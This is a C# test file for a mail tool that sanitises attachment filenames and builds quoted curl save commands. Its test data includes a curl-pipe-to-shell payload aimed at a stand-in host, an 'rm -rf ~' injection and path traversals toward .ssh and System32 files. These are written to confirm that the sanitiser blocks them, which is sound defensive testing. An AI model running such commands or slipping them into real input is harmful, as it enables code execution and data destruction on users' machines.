using OutPost2.Core.Files;
using OutPost2.Web.Mcp;

namespace OutPost2.Tests.Mail;

/// <summary>
/// save_attachment (OP2-265). The server cannot write to the caller's disk, so it hands
/// back a command the caller runs — on the user's own machine. The attachment's name is
/// written by whoever sent the mail, so most of what is tested here is that nothing a
/// sender can put in a filename escapes the directory or the quotes.
/// </summary>
public sealed class SaveAttachmentTests
{
    [Theory]
    [InlineData("invoice.pdf", "invoice.pdf")]
    [InlineData("Q3 report (final).xlsx", "Q3 report (final).xlsx")]
    [InlineData("Résumé.docx", "Résumé.docx")]
    [InlineData("../../.ssh/authorized_keys", "authorized_keys")]
    [InlineData("..\\..\\Windows\\System32\\evil.dll", "evil.dll")]
    [InlineData("..", "attachment")]
    [InlineData(".bashrc", "bashrc")]
    [InlineData("-rf.txt", "rf.txt")]
    [InlineData("$(curl evil.example|sh).pdf", "_(curl evil.example_sh).pdf")]
    [InlineData("`id`.pdf", "_id_.pdf")]
    [InlineData("it's.pdf", "it_s.pdf")]
    [InlineData("a;b&c|d.txt", "a_b_c_d.txt")]
    [InlineData("line\nbreak.txt", "line_break.txt")]
    [InlineData("trailing. ", "trailing")]
    [InlineData("CON.txt", "_CON.txt")]
    [InlineData("nul", "_nul")]
    [InlineData("", "attachment")]
    [InlineData(null, "attachment")]
    public void A_senders_filename_is_made_safe(string? given, string expected)
    {
        Assert.Equal(expected, SafeFileName.From(given));
    }

    [Theory]
    [InlineData("../../.ssh/authorized_keys")]
    [InlineData("$(rm -rf ~)'; rm -rf ~; echo '.pdf")]
    [InlineData("a`b`$c\"d'e\\f/g:h*i?j<k>l|m.txt")]
    public void Nothing_that_survives_can_break_out_of_single_quotes_or_the_directory(string given)
    {
        var safe = SafeFileName.From(given);
        foreach (var bad in new[] { '\'', '"', '`', '$', '/', '\\', ';', '|', '&', '<', '>', '*', '?', ':' })
            Assert.DoesNotContain(bad, safe);
        Assert.False(safe.StartsWith('.'));
    }

    [Fact]
    public void A_very_long_name_is_cut_but_keeps_its_extension()
    {
        var safe = SafeFileName.From(new string('a', 400) + ".pdf");
        Assert.Equal(SafeFileName.MaxLength, safe.Length);
        Assert.EndsWith(".pdf", safe);
    }

    [Fact]
    public void Two_attachments_with_one_name_do_not_overwrite_each_other()
    {
        Assert.Equal(
            ["image001.png", "image001 (2).png", "IMAGE001 (3).PNG", "notes.txt"],
            SafeFileName.Distinct(["image001.png", "image001.png", "IMAGE001.PNG", "notes.txt"]));
    }

    [Theory]
    [InlineData(null, "'invoice.pdf'")]
    [InlineData("C:/archive/2026", "'C:/archive/2026/invoice.pdf'")]
    [InlineData("C:\\archive\\2026\\", "'C:\\archive\\2026/invoice.pdf'")]
    [InlineData("/srv/records/", "'/srv/records/invoice.pdf'")]
    [InlineData("~/records", "~/'records/invoice.pdf'")]
    [InlineData("~", "~/'invoice.pdf'")]
    public void The_target_is_the_directory_and_the_safe_name_quoted(string? dir, string expected)
    {
        Assert.Equal(expected, MailTools.Target(dir, "invoice.pdf"));
    }

    [Theory]
    [InlineData("C:/it's here")]
    [InlineData("/tmp/`id`")]
    [InlineData("/tmp/a\nb")]
    [InlineData("  ")]
    public void A_directory_that_cannot_be_quoted_safely_is_refused(string dir)
    {
        Assert.NotNull(MailTools.DirectoryProblem(dir));
    }

    [Fact]
    public void A_plain_directory_is_accepted()
    {
        Assert.Null(MailTools.DirectoryProblem("C:/archive/Acme Ltd/2026"));
        Assert.Null(MailTools.DirectoryProblem(null));
    }

    [Fact]
    public void The_instructions_give_a_command_per_file_and_say_what_failure_means()
    {
        var said = MailTools.SaveInstructions("Contract", "C:/archive",
            [
                (1, "contract.pdf", "contract.pdf", "240 KB", "https://op2.example/files/attachment/t1"),
                (3, "../x.png", "x.png", "12 KB", "https://op2.example/files/attachment/t2"),
            ],
            ["2. Shared folder — a cloud link, so there is no file behind it to save."]);

        Assert.Contains("curl -fsS --create-dirs -o 'C:/archive/contract.pdf' 'https://op2.example/files/attachment/t1'", said);
        Assert.Contains("curl -fsS --create-dirs -o 'C:/archive/x.png' 'https://op2.example/files/attachment/t2'", said);
        Assert.Contains("renamed from ../x.png", said);
        Assert.Contains("Not saved:", said);
        Assert.Contains("cloud link", said);
        Assert.Contains("X-Content-SHA256", said);
        Assert.Contains("NOT saved", said);
    }
}
